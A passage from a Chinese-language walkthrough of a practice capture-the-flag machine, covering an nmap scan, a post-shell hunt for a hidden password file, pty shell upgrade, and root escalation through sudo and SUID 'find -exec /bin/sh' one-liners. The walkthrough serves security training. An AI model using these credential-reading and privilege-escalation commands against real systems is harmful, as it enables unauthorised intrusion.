### 2.nmap进行靶机端口服务扫描

```
nmap -sS -Pn -A -p- -n 192.168.100.8
```

```
\-sS  SYN 扫描，半连接
\-Pn  跳过Ping扫描阶段
\-A   全面扫描
\-p-  全端口
\-n   禁止DNS反向解析，如果单纯扫描一段IP，该选项可以大幅度减少目标主机响应时间
```

可以看到靶机只开放了一个80/http端口服务

![](../Images/8f3d9bef04040f7cc4c81bdfffacb541.png)

#### 3.反弹shell成功

查看下所有用户

![](../Images/995703af5fe308ac3ec09297b4276c27.png)

有3个用户，去各自用户下面看看

##### （1）yash用户

![](../Images/c2ad79c39299f543b796103e3d9c235f.png)

得到一个提示

```

Due to some security issues,I have saved haclabs password in a hidden file.
```

继续查看下yash用户下所有的文件

```
find / -user yash
```

![](../Images/0703b322b37b8ae3f934e419eb1b62bf.png)

也可以去除报错信息

```
find / -user yash 2>/dev/null
```

![](../Images/83b82c2d2ea83bae44c82a582c2ef6f9.png)

可以看到`/usr/share/hidden/.passwd`中应该是存放着密码

查看隐藏文件passwd

```

cat /usr/share/hidden/.passwd
```

![](../Images/daef4b6bf9d1a20e800deda3134fee97.png)

##### （2）haclabs用户

知道了haclabs用户的密码，使用su切换到haclabs用户

![](../Images/f627ff0d5ff32f00f886d958241115c4.png)

但遇到了一个问题

```
su: must be run from a terminal
```

这时候需要切换交互式shell

我们知道可以**通过python提供的pty模块创建一个原生的终端**

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

![](../Images/d4349d172a0d2b17ce67a2c46de5098f.png)

切换haclabs

```


www-data@haclabs:/var/www/html$ su haclabs
```

在haclabs的用户目录下看到`flag2.txt`

```


haclabs@haclabs:/var/www/html$ cd /home 
```

##### （3）root用户

**使用sudo提权**

```
ls -al
```

![](../Images/a7b882e354e1f913da6d0e7bf7e44b84.png)

可以看到当前目录下有sudo\_as\_admin\_successful

```
sudo -l
```

![](../Images/61c904d53ca113090133b1e00704365b.png)

**find命令不需要密码**

```
sudo find . -exec /bin/sh \\; -quit
```

![](../Images/5d860cc2e486fb0944a133a3eede2a10.png)

**使用suid提权**

查看suid文件

```
find /usr -perm -u=s -type f 2>/dev/null
```

![](../Images/5d1be55df4c0030e0985ac92c8abc7c2.png)

进行提权

```
find . -exec /bin/sh -p \\; -quit
```

进入到root目录下可以看到flag3.txt

![](../Images/dea8b10088f7793cb5519017999e21b8.png)
